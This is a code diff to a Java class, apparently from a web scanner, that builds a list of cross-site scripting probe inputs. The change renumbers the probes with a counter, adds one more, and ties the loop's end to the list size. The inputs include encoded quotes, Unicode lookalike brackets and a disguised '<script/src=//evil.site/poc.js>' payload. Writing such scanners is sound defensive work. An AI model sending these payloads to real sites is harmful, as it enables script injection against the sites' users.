@@ -74,26 +74,28 @@ public class AttackXss extends AttackI {
     }
 
     public static List<AttackData> generateAttackData(String indicator) {
+        int index = 0;
         List<AttackData> attackData = new LinkedList<AttackData>();
-        attackData.add(new AttackData(0, indicator, indicator, AttackData.AttackResultType.STATUSGOOD));
-        attackData.add(new AttackData(1, indicator + "<p>\"", indicator + "<p>\"", VULNSURE));
-        attackData.add(new AttackData(2, indicator + "%3Cp%3E%22", indicator + "<p>\"", VULNSURE));
-        attackData.add(new AttackData(3, indicator + "<p \"=>", indicator + "<p \"=>", VULNSURE));
-        attackData.add(new AttackData(4, indicator + "%3Cp%20%22%3D%3E", indicator + "<p \"=>", VULNSURE));
-        attackData.add(new AttackData(5, indicator + "' =", indicator + "' =", VULNSURE));
-        attackData.add(new AttackData(6, indicator + "%27%20%3D", indicator + "' =", VULNSURE));
-        attackData.add(new AttackData(7, indicator + "\" =", indicator + "\" =", VULNSURE));
-        attackData.add(new AttackData(8, indicator + "%22%20%3D", indicator + "\" =", VULNSURE));
-        attackData.add(new AttackData(9, indicator + "%5C%27%5C%22_\\'\\\"", indicator + "", VULNSURE));
-        attackData.add(new AttackData(10, indicator + "_\\u0022_æ_\\u00E6_", indicator + "", VULNSURE));
-        attackData.add(new AttackData(11, indicator + "%253Cp%2527%2522%253E", indicator + "<p'\">", VULNSURE));
-        attackData.add(new AttackData(12, "＜" + indicator + ">","<" + indicator, VULNSURE));
-        attackData.add(new AttackData(13, "<" + indicator + "＞", indicator + ">", VULNSURE));
-        attackData.add(new AttackData(14, "=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕"+indicator,"<script/src=//evil.site/poc.js>"+indicator, VULNSURE));
-        attackData.add(new AttackData(15, "<" + indicator + "﹥", indicator + ">", VULNSURE));
-        attackData.add(new AttackData(16, "﹤" + indicator + ">","<" + indicator, VULNSURE));
-        attackData.add(new AttackData(16, "≮" + indicator + ">","<" + indicator, VULNSURE));
-        attackData.add(new AttackData(17, "<" + indicator + "≯", indicator + ">", VULNSURE));
+        attackData.add(new AttackData(index++, indicator, indicator, AttackData.AttackResultType.STATUSGOOD));
+        attackData.add(new AttackData(index++, indicator + "<p>\"", indicator + "<p>\"", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%3Cp%3E%22", indicator + "<p>\"", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "<p \"=>", indicator + "<p \"=>", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%3Cp%20%22%3D%3E", indicator + "<p \"=>", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "' =", indicator + "' =", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%27%20%3D", indicator + "' =", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "\" =", indicator + "\" =", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%22%20%3D", indicator + "\" =", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%5C%27%5C%22_\\'\\\"", indicator + "", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "_\\u0022_æ_\\u00E6_", indicator + "", VULNSURE));
+        attackData.add(new AttackData(index++, indicator + "%253Cp%2527%2522%253E", indicator + "<p'\">", VULNSURE));
+        attackData.add(new AttackData(index++, "＜" + indicator + ">","<" + indicator, VULNSURE));
+        attackData.add(new AttackData(index++, "<" + indicator + "＞", indicator + ">", VULNSURE));
+        attackData.add(new AttackData(index++, "=[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕"+indicator,"<script/src=//evil.site/poc.js>"+indicator, VULNSURE));
+        attackData.add(new AttackData(index++, "<" + indicator + "﹥", indicator + ">", VULNSURE));
+        attackData.add(new AttackData(index++, "﹤" + indicator + ">","<" + indicator, VULNSURE));
+        attackData.add(new AttackData(index++, "≮" + indicator + ">","<" + indicator, VULNSURE));
+        attackData.add(new AttackData(index++, "<" + indicator + "≯", indicator + ">", VULNSURE));
+        attackData.add(new AttackData(index++, "℀" + indicator, "a/c" + indicator, VULNSURE));
         return new LinkedList<AttackData>(new LinkedHashSet<>(attackData));
     }
 
@@ -136,7 +138,7 @@ public class AttackXss extends AttackI {
         }
 
 
-        if (state == 17) {
+        if (state >= attackData.size() - 1) {
             doContinue = false;
         }
  
